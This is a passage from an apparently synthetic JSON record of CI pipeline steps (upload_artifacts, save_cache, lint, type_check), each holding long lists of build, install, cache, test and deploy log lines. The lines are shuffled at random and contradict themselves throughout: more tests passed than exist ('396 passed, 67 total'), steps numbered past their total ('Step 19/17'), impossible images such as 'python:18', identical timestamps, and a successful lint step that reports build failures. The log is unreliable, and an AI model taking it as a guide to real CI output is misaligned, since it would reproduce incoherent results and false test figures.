          "[12:19:53] DEBUG: Memory usage: 1554MB",
          "Processing...",
          "OK",
          "Already up to date.",
          "Step 17/23: Testing",
          "Environment: test",
          "npm install: resolved 808 packages",
          "POST /upload - 200 (240ms)",
          "pip: Downloading express-3.10.tar.gz",
          "npm install: added 99 packages",
          "WARNING: eslint has known vulnerabilities",
          "Layer 5/13: COPY command",
          "Completed.",
          "Step 19/17: Linting",
          "yarn add: Done in 5.8s",
          "TLS handshake completed",
          "Tests: 266 passed, 178 total",
          "[12:19:53] WARN: Deprecated API usage",
          "Already up to date.",
          "Generating source maps...",
          "Step 12/15: Running migrations",
          "Artifact downloaded: 12MB",
          "GET /status - 201 (72ms)",
          "Pulling image: alpine:latest",
          "npm install: added 416 packages",
          "Bundling runtime.css",
          "Image pulled successfully",
          "Cache hit for key-1465",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "npm notice: package.json updated",
          "yarn add: Done in 19.88s",
          "[12:19:53] INFO: Cache refreshed",
          "Exception: TypeError",
          "Step 17/20: Building",
          "Cache hit for key-4938",
          "FAILED: test_db_connect",
          "Optimizing 97 modules...",
          "Connection established",
          "Switched to branch 'hotfix/task-923'",
          "Verifying...",
          "Finished.",
          "Loading...",
          "Compiling utils/service.java...",
          "[12:19:53] INFO: Starting build process",
          "Time: 6.979s",
          "[12:19:53] DEBUG: Connection pool: 6 active",
          "\u2717 build failed with exit code 53",
          "Step 10/23: Linting",
          "npm install: added 267 packages",
          "FAILED: test_db_connect",
          "Compiling components/service.java...",
          "Image pulled successfully",
          "npm notice: package.json updated",
          "\u2713 Step 'test' succeeded",
          "Installing eslint@3.8.9",
          "Finished.",
          "Creating production build...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "  PASS: test_api_health (152ms)",
          "Verifying...",
          "Time: 51.439s",
          "Image pulled successfully",
          "[12:19:53] DEBUG: Loading configuration",
          "Using Node.js 17.13.2",
          "pip: Downloading eslint-3.12.tar.gz",
          "Using Python 3.12",
          "Finished.",
          "HEAD is now at 8a2502c",
          "Cache invalidated: dependencies",
          "[12:19:53] DEBUG: Memory usage: 1181MB",
          "Compiling components/service.java...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:19:53] INFO: Starting build process",
          "HEAD is now at 536cefb",
          "TLS handshake completed",
          "npm install: resolved 1500 packages",
          "=== Step upload_artifacts completed ==="
        ]
      },
      {
        "name": "save_cache",
        "status": "success",
        "started_at": "2025-11-22T12:19:59.461408",
        "finished_at": "2025-11-22T12:20:03.181949",
        "log_lines": [
          "=== Step: save_cache ===",
          "GET /status - 200 (78ms)",
          "[12:19:53] INFO: Processing request",
          "npm notice: created a lockfile",
          "  PASS: test_api_health (1ms)",
          "Pushing to registry...",
          "Using Python 3.10",
          "[12:19:53] WARN: Deprecated API usage",
          "pip: Installing build dependencies...",
          "Cache miss for key-7305",
          "[12:19:53] WARN: Deprecated API usage",
          "Cache invalidated: build",
          "Using Python 3.12",
          "Completed.",
          "Cache saved successfully",
          "Uploading artifact 'build' (26 files)",
          "Already up to date.",
          "Processing...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Cache saved successfully",
          "Uploading artifact 'coverage' (34 files)",
          "Using Python 3.11",
          "Generating source maps...",
          "FAILED: test_user_create",
          "Cache invalidated: build",
          "Success!",
          "Generating source maps...",
          "Verifying...",
          "Pulling image: node:18",
          "\u2713 Step 'build' succeeded",
          "OK",
          "[12:19:53] DEBUG: Initializing service",
          "Pushing to registry...",
          "\u2717 build failed with exit code 55",
          "\u2713 lint completed",
          "[12:19:53] WARN: Deprecated API usage",
          "Coverage: 95% statements, 63% branches",
          "[12:19:53] INFO: Cache refreshed",
          "Compiling utils/main.py...",
          "HEAD is now at 4196727",
          "Platform: linux-x64",
          "Waiting...",
          "Building Docker image...",
          "Step 14/22: Running migrations",
          "Image pulled successfully",
          "Step 11/17: Linting",
          "Cache miss for key-7147",
          "Checking out master branch",
          "Transforming 459 files...",
          "Platform: darwin-arm64",
          "Loading...",
          "[12:19:53] ERROR: Connection failed",
          "Processing...",
          "[12:19:53] DEBUG: Memory usage: 439MB",
          "\u2713 Step 'checkout' succeeded",
          "[12:19:53] WARN: Deprecated API usage",
          "[12:19:53] WARN: Deprecated API usage",
          "[12:19:53] DEBUG: Initializing service",
          "Bundling main.js",
          "Cache invalidated: build",
          "Transforming 655 files...",
          "Pulling image: python:3.11",
          "\u2713 package completed",
          "Cache saved successfully",
          "Creating production build...",
          "Compiling utils/index.js...",
          "Fetching submodules...",
          "Cache restored successfully (493MB)",
          "\u2713 lint completed",
          "Uploading artifact 'build' (49 files)",
          "Using Python 3.12",
          "Cache miss for key-4852",
          "Environment: development",
          "Verifying...",
          "Step 17/17: Installing dependencies",
          "Generating source maps...",
          "Step 15/15: Deploying",
          "  PASS: test_auth_login (191ms)",
          "Fetching submodules...",
          "Connection established",
          "Step 3/19: Testing",
          "yarn add: Done in 26.78s",
          "[12:19:53] INFO: Processing request",
          "WARNING: react has known vulnerabilities",
          "Layer 8/9: ENV command",
          "OK",
          "pip install: Successfully installed jest-2.10",
          "yarn add: Done in 26.24s",
          "WARNING: react has known vulnerabilities",
          "Pulling image: alpine:18",
          "Fetching submodules...",
          "[12:19:53] INFO: Cache refreshed",
          "FAILED: test_api_health",
          "Environment: development",
          "Minifying app.js",
          "Compiling components/app.ts...",
          "pip: Downloading eslint-4.8.tar.gz",
          "Step 6/24: Testing",
          "pip install: Successfully installed eslint-3.5",
          "\u2717 build failed with exit code 104",
          "Pulling image: python:18",
          "Platform: win32-x64",
          "POST /api - 201 (38ms)",
          "Coverage: 80% statements, 72% branches",
          "[12:19:53] DEBUG: Query executed in 81ms",
          "Layer 10/15: RUN command",
          "Minifying main.js",
          "Compiling src/service.java...",
          "Verifying...",
          "npm notice: created a lockfile",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Ran 104 tests in 52s",
          "Bundling main.js",
          "[12:19:53] INFO: Connecting to database",
          "Cache hit for key-2821",
          "Image pulled successfully",
          "Connection established",
          "Uploading artifact 'dist' (27 files)",
          "Using Node.js 17.14.1",
          "Artifact downloaded: 3MB",
          "npm install: added 485 packages",
          "Step 14/20: Building",
          "Cache hit for key-3605",
          "Cache restored successfully (71MB)",
          "Compiling components/index.js...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:19:53] DEBUG: Initializing service",
          "Artifact uploaded: dist.zip (49MB)",
          "Using Python 3.10",
          "Tests: 195 passed, 224 total",
          "[12:19:53] WARN: Deprecated API usage",
          "Processing...",
          "Waiting...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "\u2713 Step 'build' succeeded",
          "Installing eslint@1.11.6",
          "  PASS: test_cache_hit (459ms)",
          "\u2713 All checks passed",
          "[12:19:53] WARN: Deprecated API usage",
          "[12:19:53] INFO: Processing request",
          "Uploading artifact 'dist' (8 files)",
          "npm notice: package.json updated",
          "[12:19:53] DEBUG: Initializing service",
          "Using Python 3.9",
          "Processing...",
          "pip: Installing build dependencies...",
          "Finished.",
          "pip: Downloading jest-4.1.tar.gz",
          "Tests: 396 passed, 67 total",
          "Step 6/17: Building",
          "pip: Downloading prettier-1.12.tar.gz",
          "Creating production build...",
          "Transforming 457 files...",
          "Processing...",
          "Already up to date.",
          "Processing...",
          "Pushing to registry...",
          "Verifying...",
          "Minifying vendor.js",
          "Cache miss for key-1559",
          "Verifying...",
          "Cache saved successfully",
          "[12:19:53] DEBUG: Connection pool: 17 active",
          "[12:19:53] WARN: Deprecated API usage",
          "pip: Installing build dependencies...",
          "Step 14/23: Deploying",
          "Waiting...",
          "Loading...",
          "Uploading artifact 'build' (42 files)",
          "Building Docker image...",
          "Time: 64.46s",
          "[12:19:53] WARN: Deprecated API usage",
          "\u2713 test completed",
          "Generating source maps...",
          "Optimizing 55 modules...",
          "HEAD is now at 6baa367",
          "pip: Downloading axios-3.2.tar.gz",
          "Step 1/24: Installing dependencies",
          "pip: Downloading express-1.0.tar.gz",
          "TLS handshake completed",
          "Tests: 357 passed, 314 total",
          "Step 3/25: Running migrations",
          "[12:19:53] INFO: Request completed",
          "Uploading artifact 'dist' (23 files)",
          "Optimizing 16 modules...",
          "Using Python 3.9",
          "[12:19:53] DEBUG: Loading configuration",
          "Switched to branch 'bugfix/task-369'",
          "Cache saved successfully",
          "Using Node.js 20.7.9",
          "Creating production build...",
          "Artifact downloaded: 45MB",
          "WARNING: axios has known vulnerabilities",
          "Optimizing 10 modules...",
          "Success!",
          "Artifact downloaded: 26MB",
          "[12:19:53] INFO: Processing request",
          "Installing prettier@4.11.6",
          "Pulling image: python:3.11",
          "[12:19:53] DEBUG: Query executed in 28ms",
          "Layer 4/11: RUN command",
          "[12:19:53] DEBUG: Initializing service",
          "Tests: 488 passed, 304 total",
          "Connecting to startup.dev:443...",
          "\u2713 Task completed in 214ms",
          "Tests: 71 passed, 113 total",
          "Platform: linux-x64",
          "Step 13/22: Building",
          "  PASS: e2e/test_cache_hit.spec.js",
          "Step 13/17: Installing dependencies",
          "[12:19:53] INFO: Connecting to database",
          "Finished.",
          "Building Docker image...",
          "Step 8/18: Building",
          "\u2713 Task completed in 3735ms",
          "[12:19:53] INFO: Cache refreshed",
          "Building Docker image...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:19:53] INFO: Processing request",
          "[12:19:53] ERROR: Connection failed",
          "Generating source maps...",
          "pip: Installing build dependencies...",
          "[12:19:53] ERROR: Connection failed",
          "Compiling src/app.ts...",
          "Already up to date.",
          "Step 13/23: Deploying",
          "HEAD is now at b4dead2",
          "Loading...",
          "Cache miss for key-8912",
          "pip install: Successfully installed jest-3.11",
          "[12:19:53] DEBUG: Connection pool: 5 active",
          "Waiting...",
          "Compiling lib/handler.rs...",
          "yarn add: Done in 8.97s",
          "pip: Downloading jest-4.6.tar.gz",
          "[12:19:53] WARN: Deprecated API usage",
          "pip: Downloading eslint-1.4.tar.gz",
          "Time: 63.509s",
          "  PASS: test_api_health (479ms)",
          "Test Suites: 23 passed, 21 total",
          "Snapshots: 25 passed, 16 total",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Fetching submodules...",
          "Artifact uploaded: dist.zip (34MB)",
          "Using Python 3.10",
          "Step 10/24: Running migrations",
          "Done.",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Using Node.js 15.0.5",
          "Test Suites: 41 passed, 10 total",
          "[12:19:53] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (11MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:19:53] DEBUG: Initializing service",
          "Ready.",
          "Coverage: 93% statements, 84% branches",
          "Step 15/18: Running migrations",
          "Switched to branch 'hotfix/task-242'",
          "[12:19:53] DEBUG: Connection pool: 4 active",
          "WARNING: webpack has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "  PASS: unit/test_db_connect.spec.js",
          "Step 9/17: Building",
          "Cache miss for key-7256",
          "Fetching submodules...",
          "Snapshots: 19 passed, 2 total",
          "[12:19:53] DEBUG: Loading configuration",
          "Using Python 3.11",
          "[12:19:53] DEBUG: Memory usage: 867MB",
          "[12:19:53] INFO: Starting build process",
          "Fetching submodules...",
          "Switched to branch 'feature/task-892'",
          "GET /api - 201 (59ms)",
          "Success!",
          "[12:19:53] DEBUG: Connection pool: 7 active",
          "[12:19:53] WARN: Deprecated API usage",
          "yarn add: Done in 4.41s",
          "Optimizing 93 modules...",
          "POST /data - 200 (111ms)",
          "\u2713 Task completed in 2142ms",
          "[12:19:53] INFO: Request completed",
          "Cache hit for key-7899",
          "NODE_ENV=development",
          "pip install: Successfully installed prettier-3.15",
          "Step 14/20: Building",
          "Image pulled successfully",
          "Installing eslint@3.17.4",
          "[12:19:53] DEBUG: Query executed in 9ms",
          "npm notice: package.json updated",
          "=== Step save_cache completed ==="
        ]
      },
      {
        "name": "lint",
        "status": "success",
        "started_at": "2025-11-22T12:20:03.181949",
        "finished_at": "2025-11-22T12:20:09.382851",
        "log_lines": [
          "=== Step: lint ===",
          "Compiling utils/app.ts...",
          "Completed.",
          "Step 9/15: Testing",
          "Step 7/21: Running migrations",
          "Verifying...",
          "Waiting...",
          "Pulling image: alpine:3.11",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u2717 build failed with exit code 114",
          "[12:19:53] INFO: Cache refreshed",
          "Connection established",
          "Tests: 420 passed, 418 total",
          "Step 2/16: Running migrations",
          "GET /status - 204 (9ms)",
          "\u2717 build failed with exit code 38",
          "TLS handshake completed",
          "Building Docker image...",
          "Coverage: 80% statements, 83% branches",
          "Compiling components/service.java...",
          "Installing prettier@2.8.6",
          "Connecting to cloud.services:443...",
          "Step 15/16: Testing",
          "NODE_ENV=development",
          "FAILED: test_api_health",
          "npm install: added 202 packages",
          "HEAD is now at 47f7b49",
          "pip install: Successfully installed eslint-4.3",
          "POST /upload - 200 (84ms)",
          "TLS handshake completed",
          "\u2713 package completed",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Artifact downloaded: 50MB",
          "Finished.",
          "Image pulled successfully",
          "npm install: resolved 941 packages",
          "Time: 29.958s",
          "FAILED: test_user_create",
          "HEAD is now at afa9ef0",
          "Time: 80.860s",
          "Compiling src/service.java...",
          "Cache saved successfully",
          "Step 13/25: Installing dependencies",
          "pip install: Successfully installed react-1.17",
          "Ran 185 tests in 14s",
          "[12:19:53] INFO: Processing request",
          "Artifact downloaded: 33MB",
          "Connection established",
          "TLS handshake completed",
          "[12:19:53] INFO: Connecting to database",
          "pip install: Successfully installed eslint-2.13",
          "FAILED: test_db_connect",
          "[12:19:53] INFO: Cache refreshed",
          "[12:19:53] INFO: Request completed",
          "Success!",
          "Step 12/24: Building",
          "Step 5/16: Building",
          "[12:19:53] DEBUG: Memory usage: 490MB",
          "WARNING: webpack has known vulnerabilities",
          "Layer 10/9: ENV command",
          "Cache restored successfully (413MB)",
          "Done.",
          "Transforming 915 files...",
          "Switched to branch 'bugfix/task-668'",
          "Coverage: 76% statements, 72% branches",
          "Image pulled successfully",
          "NODE_ENV=production",
          "Test Suites: 20 passed, 6 total",
          "Pushing to registry...",
          "pip: Downloading prettier-3.15.tar.gz",
          "Ran 118 tests in 35s",
          "Artifact uploaded: dist.zip (43MB)",
          "Using Node.js 16.5.7",
          "Already up to date.",
          "Compiling utils/handler.rs...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Compiling components/utils.go...",
          "npm notice: created a lockfile",
          "Minifying vendor.js",
          "Checking out main branch",
          "Image pulled successfully",
          "Bundling main.js",
          "Building Docker image...",
          "Fetching submodules...",
          "  PASS: test_cache_hit (308ms)",
          "pip install: Successfully installed eslint-5.7",
          "Time: 14.51s",
          "OK",
          "Compiling utils/service.java...",
          "Building Docker image...",
          "Connection established",
          "[12:19:53] DEBUG: Initializing service",
          "[12:19:53] WARN: Deprecated API usage",
          "Coverage: 98% statements, 74% branches",
          "Loading...",
          "pip: Collecting lodash",
          "HEAD is now at da32558",
          "Cache saved successfully",
          "Already up to date.",
          "Test Suites: 28 passed, 15 total",
          "pip: Installing build dependencies...",
          "Transforming 473 files...",
          "Compiling src/index.js...",
          "Uploading artifact 'dist' (12 files)",
          "Optimizing 87 modules...",
          "Bundling main.css",
          "Building Docker image...",
          "Artifact uploaded: build.tar.gz (42MB)",
          "Test Suites: 24 passed, 27 total",
          "Compiling src/app.ts...",
          "Using Node.js 17.17.9",
          "Success!",
          "WARNING: lodash has known vulnerabilities",
          "Compiling lib/app.ts...",
          "Tests: 245 passed, 321 total",
          "[12:19:53] DEBUG: Memory usage: 664MB",
          "Step 6/18: Building",
          "Uploading artifact 'dist' (22 files)",
          "Compiling utils/app.ts...",
          "Step 5/21: Deploying",
          "Step 16/15: Building",
          "POST /data - 202 (268ms)",
          "\u2713 Task completed in 4797ms",
          "Cache invalidated: build",
          "Checking out master branch",
          "\u2713 Step 'checkout' succeeded",
          "[12:19:53] DEBUG: Initializing service",
          "Bundling main.css",
          "[12:19:53] INFO: Request completed",
          "Compiling components/service.java...",
          "HEAD is now at e747922",
          "Minifying main.js",
          "Compiling src/app.ts...",
          "Cache saved successfully",
          "Ready.",
          "Tests: 402 passed, 424 total",
          "Time: 35.110s",
          "Step 10/21: Installing dependencies",
          "Artifact uploaded: build.tar.gz (21MB)",
          "POST /data - 201 (196ms)",
          "Compiling lib/index.js...",
          "Bundling main.css",
          "Ran 28 tests in 47s",
          "Test Suites: 9 passed, 24 total",
          "Minifying vendor.js",
          "Test Suites: 8 passed, 18 total",
          "Artifact uploaded: dist.zip (99MB)",
          "Step 19/18: Testing",
          "pip install: Successfully installed jest-2.20",
          "npm notice: package.json updated",
          "Minifying app.js",
          "Connection established",
          "Artifact uploaded: dist.zip (94MB)",
          "\u2713 All checks passed",
          "Installing jest@1.14.3",
          "Cache hit for key-5602",
          "HEAD is now at d3730ce",
          "pip: Installing build dependencies...",
          "Optimizing 87 modules...",
          "Processing...",
          "Environment: staging",
          "Step 2/16: Deploying",
          "[12:19:53] ERROR: Connection failed",
          "\u2713 deploy completed",
          "[12:19:53] ERROR: Connection failed",
          "\u2713 Step 'test' succeeded",
          "Artifact uploaded: dist.zip (3MB)",
          "Artifact uploaded: build.tar.gz (47MB)",
          "Exception: NullPointerException",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "POST /data - 201 (435ms)",
          "Cache invalidated: node_modules",
          "GET /status - 201 (39ms)",
          "Using Node.js 18.9.0",
          "Time: 120.652s",
          "Loading...",
          "Success!",
          "Processing...",
          "Checking out develop branch",
          "Step 1/21: Deploying",
          "WARNING: eslint has known vulnerabilities",
          "Step 15/18: Installing dependencies",
          "\u2717 build failed with exit code 81",
          "Compiling lib/utils.go...",
          "Connecting to test.io:443...",
          "  PASS: integration/test_api_health.spec.js",
          "Tests: 353 passed, 71 total",
          "  PASS: test_db_connect (441ms)",
          "[12:19:53] DEBUG: Memory usage: 219MB",
          "Switched to branch 'hotfix/task-254'",
          "Step 15/15: Deploying",
          "Waiting...",
          "Creating production build...",
          "Artifact downloaded: 13MB",
          "  PASS: test_cache_hit (41ms)",
          "Verifying...",
          "Coverage: 79% statements, 92% branches",
          "Generating source maps...",
          "Cache miss for key-9520",
          "[12:19:53] INFO: Starting build process",
          "pip: Downloading prettier-5.13.tar.gz",
          "TLS handshake completed",
          "npm install: resolved 1855 packages",
          "[12:19:53] WARN: Deprecated API usage",
          "Transforming 567 files...",
          "Layer 7/11: RUN command",
          "[12:19:53] DEBUG: Loading configuration",
          "[12:19:53] WARN: Deprecated API usage",
          "Pushing to registry...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "POST /upload - 200 (115ms)",
          "[12:19:53] ERROR: Connection failed",
          "Processing...",
          "Cache invalidated: dependencies",
          "Transforming 910 files...",
          "Creating production build...",
          "Artifact downloaded: 2MB",
          "WARNING: prettier has known vulnerabilities",
          "Coverage: 85% statements, 81% branches",
          "yarn add: Done in 18.80s",
          "Cache miss for key-2792",
          "[12:19:53] WARN: Deprecated API usage",
          "Installing react@4.12.4",
          "GET /api - 201 (21ms)",
          "Optimizing 29 modules...",
          "Cache miss for key-8971",
          "Image pulled successfully",
          "Coverage: 75% statements, 78% branches",
          "Connection established",
          "Pulling image: python:3.11",
          "npm install: added 233 packages",
          "\u2713 Step 'test' succeeded",
          "Using Node.js 16.10.6",
          "\u2713 Step 'build' succeeded",
          "Success!",
          "NODE_ENV=production",
          "Compiling utils/service.java...",
          "Verifying...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Compiling utils/handler.rs...",
          "[12:19:53] DEBUG: Query executed in 1ms",
          "Verifying...",
          "Minifying app.js",
          "OK",
          "Test Suites: 8 passed, 37 total",
          "OK",
          "Checking out master branch",
          "Step 11/25: Testing",
          "Building Docker image...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Cache miss for key-6516",
          "Compiling components/index.js...",
          "Processing...",
          "NODE_ENV=test",
          "POST /api - 201 (326ms)",
          "HEAD is now at fdc1830",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u2713 Step 'test' succeeded",
          "Cache saved successfully",
          "Compiling components/index.js...",
          "[12:19:53] INFO: Cache refreshed",
          "NODE_ENV=test",
          "Generating source maps...",
          "Bundling main.js",
          "\u2713 All checks passed",
          "Step 3/23: Installing dependencies",
          "[12:19:53] DEBUG: Memory usage: 667MB",
          "Artifact uploaded: dist.zip (69MB)",
          "Environment: test",
          "Success!",
          "Step 11/16: Linting",
          "Fetching submodules...",
          "Bundling main.js",
          "pip: Collecting express",
          "  PASS: integration/test_cache_hit.spec.js",
          "[12:19:53] INFO: Request completed",
          "Image pulled successfully",
          "[12:19:53] INFO: Request completed",
          "Time: 83.606s",
          "POST /api - 201 (137ms)",
          "Cache restored successfully (417MB)",
          "Step 6/20: Installing dependencies",
          "npm install: resolved 824 packages",
          "Processing...",
          "Bundling main.js",
          "Environment: staging",
          "[12:19:53] INFO: Request completed",
          "[12:19:53] ERROR: Connection failed",
          "Step 13/15: Building",
          "=== Step lint completed ==="
        ]
      },
      {
        "name": "type_check",
        "status": "success",
        "started_at": "2025-11-22T12:20:09.382851",
        "finished_at": "2025-11-22T12:20:15.583753",
        "log_lines": [
          "=== Step: type_check ===",
          "NODE_ENV=development",
          "Switched to branch 'bugfix/task-292'",
          "pip: Installing build dependencies...",
          "Coverage: 86% statements, 60% branches",
          "[12:19:53] DEBUG: Loading configuration",
          "Transforming 394 files...",
          "Artifact uploaded: dist.zip (13MB)",
          "[12:19:53] DEBUG: Connection pool: 15 active",
          "\u2713 Step 'build' succeeded",
          "HEAD is now at d313a12",
          "Switched to branch 'bugfix/task-315'",
          "Fetching submodules...",
          "Image pulled successfully",
          "Generating source maps...",
          "WARNING: webpack has known vulnerabilities",
          "npm install: resolved 853 packages",
          "POST /upload - 201 (390ms)",
          "Using Python 3.9",
          "OK",
          "pip install: Successfully installed lodash-1.16",
          "Cache invalidated: build",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Artifact uploaded: build.tar.gz (29MB)",
          "\u2713 Step 'build' succeeded",
          "Coverage: 92% statements, 61% branches",
          "Cache saved successfully",
          "Step 17/18: Testing",
          "Installing axios@5.2.10",
          "Artifact uploaded: dist.zip (42MB)",
          "[12:19:53] ERROR: Connection failed",
          "Ran 115 tests in 17s",
          "[12:19:53] INFO: Request completed",
          "[12:19:53] DEBUG: Memory usage: 250MB",
          "Done.",
          "GET /health - 201 (38ms)",
          "Cache hit for key-3523",
          "Cache hit for key-5261",
          "Creating production build...",
          "[12:19:53] DEBUG: Memory usage: 1875MB",
          "[12:19:53] DEBUG: Loading configuration",
          "Success!",
          "Step 15/17: Building",
          "Artifact uploaded: dist.zip (72MB)",
          "\u2713 Task completed in 1985ms",
          "Image pulled successfully",
          "Transforming 457 files...",
          "yarn add: Done in 22.31s",
          "OK",
          "[12:19:53] DEBUG: Memory usage: 1651MB",
          "Cache hit for key-6632",
          "\u2713 build completed",
          "Cache restored successfully (13MB)",
          "Building Docker image...",
          "  PASS: integration/test_auth_login.spec.js",
          "Artifact downloaded: 41MB",
          "pip: Downloading axios-5.19.tar.gz",
          "Time: 6.754s",
          "Compiling components/index.js...",
          "npm install: resolved 1571 packages",
          "Fetching submodules...",
          "Transforming 938 files...",
          "npm install: resolved 1127 packages",
          "Step 12/24: Building",
          "yarn add: Done in 29.34s",
          "Test Suites: 41 passed, 18 total",
          "Using Node.js 16.16.8",
          "  PASS: test_user_create (472ms)",
          "Building Docker image...",
          "Environment: staging",
          "[12:19:53] INFO: Cache refreshed",
          "TLS handshake completed",
          "HEAD is now at d2401ac",
          "Test Suites: 21 passed, 11 total",
          "HEAD is now at dfa6451",
          "Optimizing 10 modules...",
          "Finished.",
          "Tests: 404 passed, 253 total",
          "GET /status - 204 (95ms)",
          "Snapshots: 48 passed, 37 total",
          "Checking out master branch",
          "NODE_ENV=test",
          "Artifact uploaded: dist.zip (94MB)",
          "Step 5/18: Installing dependencies",
          "Cache invalidated: build",
          "Processing...",
          "Fetching submodules...",
          "Cache invalidated: node_modules",
          "Coverage: 94% statements, 66% branches",
          "Pulling image: node:3.11",
          "Time: 112.313s",
          "Done.",
          "[12:19:53] DEBUG: Initializing service",
          "Cache miss for key-5443",
          "Bundling runtime.js",
          "npm install: added 399 packages",
          "yarn add: Done in 27.47s",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:19:53] WARN: Deprecated API usage",
          "Tests: 259 passed, 123 total",
          "npm notice: created a lockfile",
          "HEAD is now at 40be4fa",
          "Compiling utils/service.java...",
          "[12:19:53] DEBUG: Loading configuration",
          "[12:19:53] INFO: Connecting to database",
          "Switched to branch 'hotfix/task-662'",
          "Image pulled successfully",
          "[12:19:53] INFO: Starting build process",
          "Success!",
          "Compiling components/index.js...",
          "Done.",
          "[12:19:53] WARN: Deprecated API usage",
          "POST /upload - 200 (314ms)",
          "Finished.",
          "[12:19:53] INFO: Processing request",
          "Success!",
          "[12:19:53] INFO: Processing request",
          "pip: Installing build dependencies...",
          "[12:19:53] INFO: Starting build process",
          "Finished.",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "npm install: added 498 packages",
          "HEAD is now at acdfcc3",
          "OK",
          "WARNING: express has known vulnerabilities",
          "Exception: RuntimeError",
          "Coverage: 82% statements, 67% branches",
          "Pushing to registry...",
          "\u2713 Task completed in 2054ms",
          "  PASS: unit/test_api_health.spec.js",
          "\u2713 All checks passed",
          "Loading...",
          "Step 4/22: Building",
          "Pulling image: python:18",
          "[12:19:53] DEBUG: Initializing service",
          "Platform: linux-x64",
          "Cache hit for key-4731",
          "TLS handshake completed",
          "Optimizing 77 modules...",
          "Transforming 261 files...",
          "Image pulled successfully",
          "Step 10/22: Deploying",
          "Ready.",
          "Artifact uploaded: build.tar.gz (28MB)",
          "Already up to date.",
          "FAILED: test_db_connect",
          "Generating source maps...",
          "Step 7/22: Installing dependencies",
          "npm install: added 220 packages",
          "Test Suites: 8 passed, 5 total",
          "Tests: 445 passed, 295 total",
          "Ready.",
          "Fetching submodules...",
          "Artifact uploaded: build.tar.gz (36MB)",
          "[12:19:53] DEBUG: Loading configuration",
          "npm install: resolved 1642 packages",
          "NODE_ENV=production",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Bundling main.css",
          "HEAD is now at 5273959",
          "[12:19:53] INFO: Starting build process",
          "[12:19:53] WARN: Deprecated API usage",
          "Connection established",
          "Pulling image: node:latest",
          "NODE_ENV=test",
          "Checking out master branch",
          "Cache saved successfully",
          "Cache restored successfully (467MB)",
          "FAILED: test_user_create",
          "Checking out develop branch",
          "Coverage: 92% statements, 97% branches",
          "  PASS: unit/test_api_health.spec.js",
          "Pulling image: node:18",
          "Cache hit for key-3559",
          "npm install: added 108 packages",
          "Pushing to registry...",
          "[12:19:53] DEBUG: Initializing service",
          "NODE_ENV=test",
          "Creating production build...",
          "Step 3/19: Running migrations",
          "Cache restored successfully (342MB)",
          "GET /api - 201 (82ms)",
          "Minifying vendor.js",
          "Coverage: 99% statements, 74% branches",
          "npm install: added 375 packages",
          "Compiling lib/app.ts...",
          "[12:19:53] WARN: Deprecated API usage",
          "Done.",
          "[12:19:53] WARN: Deprecated API usage",
          "Platform: darwin-arm64",
          "Building Docker image...",
          "[12:19:53] DEBUG: Loading configuration",
          "Cache restored successfully (405MB)",
          "Connecting to startup.dev:443...",
          "Using Node.js 19.17.1",
          "Step 19/21: Building",
          "\u2713 Step 'setup' succeeded",
          "Connecting to example.com:443...",
          "Image pulled successfully",
          "[12:19:53] WARN: Deprecated API usage",
          "Step 16/15: Linting",
          "Generating source maps...",
          "Generating source maps...",
          "Success!",
          "WARNING: lodash has known vulnerabilities",
          "  PASS: integration/test_cache_hit.spec.js",
          "TLS handshake completed",
          "Loading...",
          "Image pulled successfully",
          "Minifying main.js",
          "Completed.",
          "\u2713 test completed",
          "Step 5/25: Installing dependencies",
          "[12:19:53] ERROR: Connection failed",
          "Completed.",
          "\u2717 build failed with exit code 9",
          "Cache miss for key-5993",
          "Generating source maps...",
          "Artifact uploaded: dist.zip (44MB)",
          "npm notice: created a lockfile",
          "Fetching submodules...",
          "Cache restored successfully (39MB)",
          "\u2713 Step 'build' succeeded",
          "Platform: linux-x64",
          "Using Node.js 20.17.9",
          "Optimizing 55 modules...",
          "Platform: linux-x64",
          "pip install: Successfully installed prettier-3.12",
          "Step 11/24: Deploying",
          "Artifact downloaded: 22MB",
          "Step 16/20: Linting",
          "npm notice: created a lockfile",
          "Compiling src/app.ts...",
          "Pushing to registry...",
          "Step 15/23: Building",
          "Time: 65.557s",
          "yarn add: Done in 27.23s",
          "Success!",
          "Using Python 3.11",
          "Uploading artifact 'coverage' (19 files)",
          "[12:19:53] DEBUG: Loading configuration",
          "[12:19:53] INFO: Starting build process",
          "Layer 10/10: COPY command",
          "Generating source maps...",
          "Checking out main branch",
          "[12:19:53] DEBUG: Initializing service",
          "\u2713 lint completed",
          "Compiling src/handler.rs...",
          "Building Docker image...",
          "WARNING: react has known vulnerabilities",
          "Ran 199 tests in 7s",
          "Success!",
          "npm install: resolved 1361 packages",
          "Creating production build...",
          "Snapshots: 23 passed, 49 total",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "NODE_ENV=test",
          "Cache hit for key-8557",
          "[12:19:53] DEBUG: Loading configuration",
          "[12:19:53] WARN: Deprecated API usage",
          "GET /api - 200 (64ms)",
          "Step 16/24: Running migrations",
          "pip: Installing build dependencies...",
          "Step 18/18: Deploying",
          "[12:19:53] DEBUG: Loading configuration",
          "\u2713 All checks passed",
